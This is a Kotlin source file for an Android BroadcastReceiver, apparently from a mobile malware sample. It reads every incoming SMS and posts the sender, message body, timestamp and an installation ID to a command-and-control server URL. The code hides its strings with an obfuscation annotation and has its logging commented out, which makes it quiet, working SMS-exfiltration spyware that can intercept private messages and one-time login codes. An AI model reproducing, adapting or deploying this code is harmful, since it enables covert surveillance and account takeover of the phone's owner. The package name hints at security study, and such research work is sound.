package com.mobilesec.govcomm.mal

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.mobilesec.govcomm.mal.getInstallationId
import io.github.c0nnor263.obfustringcore.ObfustringThis
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
@ObfustringThis
class SmsReceiver : BroadcastReceiver() {

    private val client = OkHttpClient()

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (message in smsMessages) {
                val sender = message.displayOriginatingAddress
                val body = message.messageBody
                val date = message.timestampMillis // Get the date from the SMS message
                //Log.d("SmsRecv", "Received SMS from $sender")
                sendSmsToServer(context, sender, body, date)
            }
        }
    }

    private fun sendSmsToServer(context: Context?, sender: String, messageBody: String, date: Long) {
        CoroutineScope(Dispatchers.IO).launch {
            val installationId = context?.let { getInstallationId(it) }
            val smsDataJsonObject = JSONObject().apply {
                put("uuid", installationId)
                put("type", "receive") // Hardcoded to "receive", since it is incoming from Broadcast Receiver
                put("address", sender)
                put("body", messageBody)
                put("date", date)
            }

            val mediaType = "application/json; charset=utf-8".toMediaType()
            val requestBody = smsDataJsonObject.toString().toRequestBody(mediaType)
            val request = Request.Builder()
                .url(SecurityUtils.c2ServerUrl + "/receive_broadcast_sms")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    //Log.e("HTTP_SEND", "Failed to send SMS data to C2 server: ${response.code}")
                } else {
                    //Log.d("HTTP_SEND", "SMS data sent to C2 server successfully")
                }
            }
        }
    }
}

